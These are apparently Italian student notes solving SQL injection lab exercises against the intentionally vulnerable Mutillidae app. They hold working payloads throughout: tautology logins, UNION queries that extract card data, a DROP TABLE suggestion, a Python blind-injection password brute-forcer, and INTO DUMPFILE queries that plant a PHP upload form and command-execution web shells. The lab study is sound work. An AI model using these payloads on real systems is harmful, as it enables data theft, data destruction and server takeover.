## Esercizio 1
> Tramite la pagina User Info (SQL) raggiungibile al seguente indirizzo http://192.168.122.182/mutillidae/index.php?page=user-info.php determinare a quali caratteri è vulnerabile l’applicazione.

```
E' sufficiente inserire un carattere `'` per causare un'errore dal quale si evince che manca la sanificazione dell'input, ma soprattutto che anche la gestione degli errori non è ben strutturata poiché viene anche visualizzata la query eseguita : *Query: SELECT * FROM accounts WHERE username='' ' AND password='' (0)* 

Provando ad inserire un carattere di commento, il quale *taglia* il resto della query, vediamo che essa viene eseguita. Pertanto possiamo evincere che il sito è vulnerabile a SQL injection.
```
## Esercizio 2
> Sempre tramite la pagina user info sfruttare qualche tautologia di base per riuscire a recuperare i dati di tutti gli utenti. In particolare si vuole recuperare *username,password,signature*

Possibile soluzione: *aggiungere una tautologia che rende la query sempre vera,
cioè tutte le righe della tabella soddisfano la query*.

Oppure aggiungere un comando : `; DROP TABLE users`

```sql
' OR 1=1 -- 
```

Inserendo questa tautologia di base, è possibile prendere tutti gli username, password e signature dei vari utenti.


Condurre poi un'attacco multi step 

## Esercizio 3
> In questa prima parte dell’esercizio, si utilizzerà l’operatore SQL UNION per eseguire un attacco di SQL Injection. 
> Il primo obiettivo è determinare il nome delle tabelle presenti del DB e le relative colonne, utilizzando le clausole NULL e ORDER BY o dei stringhe.
> Una volta ottenuto il nome della tabella desiderata occorre recuperare dettagli critici come la data di scadenza e il codice CCV per un numero di carta specifico. 
> In particolare, i passi da seguire sono: 
> 1. Determinare i nomi delle tabelle
> 2. Determinare i nomi delle colonne di ogni tabella
> 3. Stampare data di scadenza e CCV per il numero di carta 1234567812345678.



Quante colonne ritorna la SELECT a cui si vuole aggiungere una nuova query mediante UNION?

La direttiva UNION consente di unire i risultati di due diverse query che
- hanno lo stesso numero di colonne
- e sopratutto sono colonne dello stesso tipo(o di tipi compatibili )
*Se il numero di colonne non corrisponde, il DBMS genera errori utili per riconoscere il DB, del tipo : **The used SELECT statements have adifferent number of columns***.


Due metodi:  
- mediante query di tipo SELECT
- mediante clausole ORDER BY
ORDER BY ordina i risultati sulla base del valore di una colonna, identificata con:
- Il nome della colonna - ORDER BY Titolo
- La posizione della colonna - ORDER BY 1

```sql
' ORDER BY 8' genera errore, quindi il numero di colonne della tabella è 7
```



```
' UNION SELECT null,null,null,null,null,null,null -- 
```

Dopo aver scoperto il numero esatto, usare SELECT e sostituire null con valori dal tipo noto
*Esempio : determinare se il primo campo contiene una stringa*

```sql
[QUERY 1] UNION SELECT ‘test’,null,null --
se non c’è errore, la prima colonna è una stringa
```

**PROBLEMA**
Da questo tipo di test riusciamo solo a capire se quel campo è una stringa o meno.
*SE il testo `'test'` viene visualizzato in OUTPUT, allora quel campo è utilizzabile per estrarre informazioni*
```sql
' UNION SELECT null,'test',null,null,null,null,null -- 
```

Results for "' UNION SELECT null,'test',null,null,null,null,null -- ".1 records found.
Username=test
Password=
Signature=


*Quindi il secondo campo è iniettabile, ora proviamo gli altri*.
```sql
' UNION SELECT null,'test','test','test',null,null,null -- 
```

I primi 3 campi sono iniettabili.

Proviamo a determinare i nomi delle tabelle.

The INFORMATION_SCHEMA database is a virtual database that MySQL uses to store metadata about the server and its databases. It provides access to the read-only information about database objects and server statistics. 

*MySQL provides a powerful set of system tables known as the **INFORMATION_SCHEMA** tables that contain metadata about the database system, including the databases, tables, columns, indexes, privileges, and more.* 

```sql
' UNION SELECT null,table_name,'test','test',null,null,null FROM information_schema.tables -- 
```


ORA proviamo ad estrarre i nomi delle colonne. Io qua ho fatto una cosa più carina, cioè tramite la funzione CONCAT, ho stampato anche il nome della tabella a cui appartiene.

```sql
' UNION SELECT null,CONCAT(table_name, ':', column_name),'test','test',null,null,null FROM information_schema.columns -- 
```

Username=credit_cards:ccid  
Password=test  
Signature=test  
  
Username=credit_cards:ccnumber  
Password=test  
Signature=test  
  
Username=credit_cards:ccv  
Password=test  
Signature=test  
  
Username=credit_cards:expiration  
Password=test

ORA CERCO PER QUELLA CARTA
```sql
' UNION SELECT null,ccv,expiration,'test',null,null,null FROM credit_cards WHERE ccnumber='1234567812345678' -- 
```

## Esercizio 4 - Autenticazione

> Tramite il form di *login* presente in index.php?page=login.php, autenticari senza inserire nessuna password, determinando quindi l'utente di default usato. presente in  index.php?page=login.php, autenticarsi senza inserire nessuna password , determinando  quindi l'utente di default usato. (A1 -> Bypass authentication).

In questo caso si può pensare di usare una tautologia di base. Poiché io sto chiedendo di valutare la query `prova' OR 1=1 -- `
	Quindi valuto la query `prova'` ma con l'apice termino quella stringa. Quindi se il sito è vulnerabile tramite SQL injection, per me è possibile entrare perché viene valutata la query prima oppure `SE 1=1`. Dato che l'espressione è sempre vera, per me è possibile autenticarmi.


## Esercizio 5 - Autenticarsi senza password
> Autenticarsi come `scotty` senza però conoscere la sua password. Sfruttare l'output dell'esercizio 2 per essere sicuri che *scotty* esista. 


In questo caso, è carino perché se inserisci una *tautologia*, ti autentica come admin. 
Idea, magari la query eseguita è qualcosa del tipo `SELECT * FROM userse WHERE username='$username' AND password='$password'` ... QUINDI io non voglio che venga proprio valutata la password di `scotty`.

--> TRONCARE la query subito dopo lo username: `scotty' -- ` . In questo modo, non viene proprio valutata la seconda parte della query.

## Esercizio 6
>L’obiettivo di questo esercizio è autenticarsi utilizzando tecniche di tipo SQL Blind [ref]. In particolare, sempre tramite la pagina di login http://127.0.0.1/mutillidae/index.php?page=login.php si richiede di determinare la password dell’utente john.
>Suggerimenti:
>- determinare la lunghezza della password, tramitel'operatore LENGTH
>- Determinare ogni carattere della password in modo interativo, fancedo uso di SUBSTRING
>- Provare a realizzare un piccolo script puthon che automatizzi questo processo.


Idee:
1. `prova' OR 1=1 -- ` **MA questo forza** **il valore di verità logica** nel controllo dell'esistenza, quindi l'app genera un "account is valid" per ogni possibile identificatore.
2. `prova' AND 1=2` forza una falsità logica, "account not valid", quindi anche se c'è un account `prova`, darà sempre errore.
3. `prova' AND 1=1` non altera la condizione di verità logica, Se `prova` esiste, stamperà "account is valid".

QUINDI 
1. `id_esistente' AND [condizione arbitraria]` : il valore della clausola WHERE dipende interamente dalla tabella di falsità logica della condizione arbitraria a destra dell'AND, **faccio il login solo se la condizione a destra è vera**.

	USARE la funzione ***SUBSTRING( stringa , posizione , lunghezza )*** : prende la stringa, raggiunge il carattere indicato dalla `posizione` e genera una sottostringa di `lunghezza` a partire da quel carattere.

Ma prima di tutto, di quanto è lunga la password di john?
`john' AND LENGTH(password)=6 -- ` se questo è vero vengno stampate le info di john o fatto il login, dipende da dove la si sta provando, vale a dire che anche la seconda parte della verità logica è vera.
```sql
john' AND LENGTH(password)=6 -- 
```
ORA però dobbiamo trovare i caratteri della password uno a uno.
SUBSTRING del campo `password` che va `dal primo carattere al secodono si fa con SUBSTRING(password, 1,1) ='a'` , cioè se è uguale ad A, facciamo che è vero.

`john' AND SUBSTRING(password, 1, 1) = 'a' --
	provando un pò di alternative si arrvia a
	`john' AND SUBSTRING(password, 1, 1) = 'm' -- `
	quindi il primo carattere della stringa è 'm'. Vengono così visualizzate le credenziali/fatto il login. Io so che la password di john è monkey. Per provare, posso fare che controllo il secondo carattere è 'o' --> `john' AND SUBSTRING(password, 2, 1) = 'o' -- 

Volendo posso anche fare un Select in select : 
```sql
john' and 6=(SELECT LENGTH(password) FROM accounts WHERE username="john" LIMIT 1) -- 
```

LIMIT selezione i primi TOT elementi che trova.

#### PT.2 --> creazione di uno script 
IDEA di base : cosa succede quando faccio il login corretto? 
--> ci si viene reindirizzati alla home dopo che si è fatto il login.

Presumibilmente però, si sarà effettuata una richiesta HTTP da qualche parte. Proviamo a controllare nel browser se parte una richiesta da qualche parte.
--> DI FATTI parte una richiesta POST verso `http://192.168.122.182/mutillidae/index.php?page=login.php` 

con i seguenti parametri :
```js
username=john
password=monkey
login-php-submit-button=Login
```

E poi si viene indirizzati alla pagina HOME.

IDEA: posso fare io intanto un richiesta HTTP post dove al posto del parametro john, metto la mia query per capire se mi fa fare il login.

Analizzo poi se mi manda o meno al login. 
COME? magari vedo la lunghezza della risposta. Tipo l'html della pagina di home dopo il login è grande TOT.  IN questo modo ho capito se ho fatto il login, quindi la dimensione della password è 6.

Poi però dovrei CAPIRE qual è la password.

Dovrei fare `SUBSTRING(password, 1, 1)= a,b,c,d,e,f,g,h,i....` In sostanza dovrei provare tutti i caratteri uno alla volta. 

--> MA se ci fossero anche dei numeri cosa faccio? Dovrei avere una stringa contenente tutti i possibili caratteri. 

Per fortuna in python esiste una cosa chiamata `string.printable` che contiene tutti i possibili caratteri stampabili come stringa.

```python
import string
alphabet = string.printable
```

Quindi paragono ogni risultato della funzione substring con uno dei caratteri di `alphabet`.
Successivamente si fa una richiesta POST e poi si analizza la risposta. Se è uguale a quella che avevi trovato prima, a posto, vuol dire che hai trovado la password.

Stampi ad ogni turno la password trovata. DEVI METTERE il break.



```python
for i in range(1,9):

    for j in alphabet:
        
        data = {
        'username': f"simba' and substring(password,{i},1)='{j}' -- ",
        'password': "",
        'login-php-submit-button': "login",
        }
        response = requests.post(url, data=data)
        if len(response.text) == 50095:
            print("ho indovinato il carattere ", j)
            password_trovata.append(j)
            break ## devi mettere questa, perché sennò mi continua a controllare anche le lettere maiuscole

print(password_trovata)
```

## Esercizio 7
> In questo esercizio viene richiesto di sfruttare tecniche di SQL Injection per caricare file PHP nell’applicazione Web. In particolare, si richiede di poter eseguire una Web Shell direttamente dal browser utilizzato. Ottenuta una Web Shell, determinare l’utente che sta eseguendo il Web server, il suo uid e il suo gid
> Suggerimenti:
1. Determinare il percorso dove sono memorizzati i file PHP dell\u2019applicazione Web (controllare gli errori
sulle pagine web)
2. Tramite la pagina User info possibile memorizzare su file, usando loperatore INTO DUMPFILE, il contenuto di una query specifica.
3. Creare quindi una pagina html e PHP contenente una form che permetta di file che verranno poi eseguiti. Uso della funzione PHP move_uploaded_file 
4. Create (o cercate online) una una web shell in PHP che mostri del comandi bash inviati.


Questo esercizio fa rifermento alla pagina user-info `http://192.168.122.123/mutillidae/index.php?page=user-info.php`.

1. Lanciando un semplice comando `admin'` è possibile vedere i messaggi di errore generati. La consegna ci chiede di capire *dove sono memorizzati file php*. Dal messaggio di errore capiamo che si trovano in `http://SERVERIP/mutillidae/classes/`
2. La seconda parte ci chiede *Tramite la pagina User info è possibile memorizzare su file, usando l’operatore INTO DUMPFILE[ref], il contenuto di una query specifica
	1. L'idea è di scrivere un file php che ti dà la possibilità di creare caricare file nel server.
	2. Potresti provare a creare un file di test, per vedere se si riesce ad iniettare del codice php. Ecco un possibile codice php `<?php phpinfo(); ?>` 
	   Ora però la domanda è, come faccio ad inserire un nuovo file php? Il prof ci ha suggeruti una funzione chiamata `INTO DUMPFILE`.
	3. Ecco la query :

```sql
test' UNION ALL SELECT "<?php phpinfo(); ?>\n",NULL,NULL,NULL,NULL,NULL,NULL INTO DUMPFILE '/var/www/html/mutillidae/classes/upload_test.php'-- -
```

The [`SELECT ... INTO`](https://dev.mysql.com/doc/refman/8.4/en/select-into.html "15.2.13.1 SELECT ... INTO Statement") form of [`SELECT`](https://dev.mysql.com/doc/refman/8.4/en/select.html "15.2.13 SELECT Statement") enables a query result to be stored in variables or written to a file:
- SELECT ... INTO DUMPFILE writes a single row to a file without any formatting. 

Poi apri il browser `http://192.168.122.123/mutillidae/classes/` e dovresti trovarti il tuo file `upload_test.php` caricato. Se lo apri dovresti vedere info su php, che è la funzione.


3. ***Come facciamo a sfruttare questa vulnerabilità?***
   Possiamo creare un file php contente un form che mi permette di caricare file e che faccia uso della funzione `move_uploaded_file` come suggerito dal prof.

Uno script possibile è il seguente.
```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_FILES['file'])) {
        $file_tmp = $_FILES['file']['tmp_name'];
        $file_name = basename($_FILES['file']['name']);
        $upload_dir = './uploads/';

        if (!is_dir($upload_dir)) {
            mkdir($upload_dir, 0777, true);
        }

        if (move_uploaded_file($file_tmp, $upload_dir . $file_name)) {
            echo "File caricato con successo: <a href='uploads/$file_name'>$file_name</a>";
        } else {
            echo "Errore durante il caricamento del file.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Upload</title>
</head>
<body>
    <h2>Carica un file</h2>
    <form action="upload.php" method="POST" enctype="multipart/form-data">
        Seleziona file:
        <input type="file" name="file">
        <input type="submit" value="Carica">
    </form>
</body>
</html>

```

Ma per poterla eseguire, devi metterla su una riga. E poi devi creare la query SQL facendo uso della UNION.

```sql
test' UNION ALL SELECT "<?php if($_SERVER['REQUEST_METHOD']=='POST'){if(isset($_FILES['file'])){$file_tmp=$_FILES['file']['tmp_name'];$file_name=basename($_FILES['file']['name']);$upload_dir='./uploads/';if(!is_dir($upload_dir)){mkdir($upload_dir,0777,true);}if(move_uploaded_file($file_tmp,$upload_dir.$file_name)){echo 'File caricato con successo: <a href=uploads/'.$file_name.'>'.$file_name.'</a>'; }else{echo 'Errore durante il caricamento del file.';}}}?><html><body><h2>Carica un file</h2><form action='upload.php' method='POST' enctype='multipart/form-data'><input type='file' name='file'><input type='submit' value='Carica'></form></body></html>\n",NULL,NULL,NULL,NULL,NULL,NULL INTO DUMPFILE '/var/www/html/mutillidae/classes/upload.php'-- -
```


Vedrai che già ti appare il form su OWASP, ma se provi ad andare dal brower, lo vediamo meglio `http://192.168.122.123/mutillidae/classes/upload.php`.



4. ***Manca l'ultima parte, quella di eseguire una web shell in PHP che mostri l’output del comandi bash inviati.***



Ecco cosa iniettare:
```sql
test' UNION ALL SELECT "<?php system($_GET['cmd']); ?>",null,null,null,null,null,null INTO DUMPFILE '/var/www/html/mutillidae/classes/shell.php'-- 
```

Abbiamo iniettato il file `shell.php`. 
ATTENZIONE: se ci vai, non vedi nulla perché non ha niente in output, ma per interagirci devi passarci un parametro chiamato `cmd` da get:

Per vedere UID e GID, passare il comando `id`
`http://[IP-SERVER]/mutillidae/shell.php?cmd=id`


Ma ci puoi passare tutto quello che vuoi, tipo `ls, whoami` insomma comandi linux.
`http://192.168.122.123/mutillidae/classes/shell.php?cmd=ls`


Alternativa più carina:
```sql
test' UNION SELECT 
"<?php echo '<html><body><form method=\"GET\" name=\"' . basename(\$_SERVER['PHP_SELF']) . '\"><input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre>'; if(isset(\$_GET['cmd'])) { system(\$_GET['cmd'] . ' 2>&1'); } echo '</pre></body></html>'; ?>", 
NULL,NULL,NULL,NULL,NULL,NULL 
INTO DUMPFILE '/var/www/html/mutillidae/classes/webshell1.php'-- 
```


